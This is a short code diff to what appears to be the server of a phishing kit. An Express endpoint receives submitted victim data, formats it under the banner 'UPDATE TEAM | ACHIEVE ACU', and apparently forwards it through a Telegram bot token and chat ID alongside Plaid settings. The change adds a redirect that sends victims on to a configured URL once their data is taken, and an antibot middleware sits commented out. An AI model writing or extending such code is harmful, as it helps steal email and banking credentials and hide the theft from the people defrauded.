@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const { botToken, chatId, plaid } = require('./config/settings.js');
+const { botToken, chatId, plaid, redirect_url } = require('./config/settings.js');
 //const antibot = require('./middleware/antibot');
 //const { getClientIp } = require("request-ip");
 const https = require('https');
@@ -272,6 +272,8 @@ app.post('/receive', async (req, res) => {
         `========================\n` +
         `✅ UPDATE TEAM | ACHIEVE ACU\n` +
         `💬 Telegram: https://t.me/updteams\n`;
+        
+        res.send({ url: redirect_url});
     }
 
     if (myObjects.includes('email')) {
